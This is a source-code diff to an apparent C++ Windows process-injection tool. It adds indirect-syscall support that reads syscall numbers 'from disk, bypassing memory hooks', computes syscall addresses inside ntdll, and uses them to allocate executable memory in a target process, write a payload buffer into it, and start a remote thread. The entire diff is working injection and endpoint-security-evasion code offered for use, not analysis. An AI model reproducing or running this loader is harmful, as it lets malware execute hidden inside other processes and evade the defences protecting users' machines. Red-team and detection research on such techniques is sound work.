@@ -7,6 +7,22 @@
 #include "ps-utils.h"
 
 extern "C" {
+    DWORD wNtAllocateVirtualMemorySSN = 0;
+    UINT_PTR sysAddrNtAllocateVirtualMemory = 0;
+
+    DWORD wNtWriteVirtualMemorySSN = 0;
+    UINT_PTR sysAddrNtWriteVirtualMemory = 0;
+
+    DWORD wNtProtectVirtualMemorySSN = 0;
+
+    DWORD wNtCreateThreadExSSN = 0;
+    UINT_PTR sysAddrNtCreateThreadEx = 0;
+
+    DWORD wNtWaitForSingleObjectSSN = 0;
+    UINT_PTR sysAddrNtWaitForSingleObject = 0;
+}
+
+extern "C" {
         // https://ntdoc.m417z.com/NtAllocateVirtualMemory
         NTSTATUS IndirectSysNtAllocateVirtualMemory(
             HANDLE ProcessHandle,    
@@ -27,7 +43,7 @@ extern "C" {
         );
 
         // https://ntdoc.m417z.com/ntcreatethreadex
-        NTSTATUS SysNtCreateThreadEx(
+        NTSTATUS IndirectSysNtCreateThreadEx(
             PHANDLE ThreadHandle,        
             ACCESS_MASK DesiredAccess,   
             PVOID ObjectAttributes,      
@@ -83,6 +99,37 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Running PI with target PID: %u\n", pid);
 
+	// Dynamically find the SSNs from disk, bypassing memory hooks
+	wNtAllocateVirtualMemorySSN = GetSSNByName("NtAllocateVirtualMemory");
+	wNtWriteVirtualMemorySSN = GetSSNByName("NtWriteVirtualMemory");
+	wNtProtectVirtualMemorySSN = GetSSNByName("NtProtectVirtualMemory");
+	wNtCreateThreadExSSN = GetSSNByName("NtCreateThreadEx");
+	wNtWaitForSingleObjectSSN = GetSSNByName("NtWaitForSingleObject");
+
+	if (!wNtAllocateVirtualMemorySSN) {
+		printf("[!] Error: Could not find clean SSNs from disk.\n");
+		return -1;
+	}
+
+	printf("[+] SSNs Loaded: Allocate(0x%X), Write(0x%X), Protect(0x%X), CreateThread(0x%X), WaitForSingleObject(0x%X)\n",
+		wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);	
+	
+	// Get a handle to the ntdll.dll library
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	if (hNtdll == NULL) {
+		return 1;
+	}
+
+	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+	UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+	sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+	sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
+	sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
+	
     // Open a handle to the current process, this must be passed to VirtualAllocEx
     HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
     if (pHandle == NULL) {
@@ -93,20 +140,19 @@ int main(int argc, char* argv[]) {
     printf("[*] Successfully opened handle to PID: %u\n", pid);
 
     PVOID bufferAddress = NULL;
-	  SIZE_T buffSize = sizeof(buf); 
-	  //SysNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    IndirectSysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	SIZE_T buffSize = sizeof(buf); 
+	//SysNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	IndirectSysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
-	  SIZE_T bytesWritten;
-	  //SysNtWriteVirtualMemory(GetCurrentProcess(), bufferAddress, buf, sizeof(buf), &bytesWritten);
+	SIZE_T bytesWritten;
+	//SysNtWriteVirtualMemory(GetCurrentProcess(), bufferAddress, buf, sizeof(buf), &bytesWritten);
     IndirectSysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);
 
-	  HANDLE hThread;	
-	  //SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
+	HANDLE hThread;	
+	//SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
     IndirectSysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
 	
-	  IndirectSysNtWaitForSingleObject(hThread, FALSE, NULL);
-	  getchar();
-
+	IndirectSysNtWaitForSingleObject(hThread, FALSE, NULL);
+    printf("[+] Process injection complete.\n");
     return 0;
 }
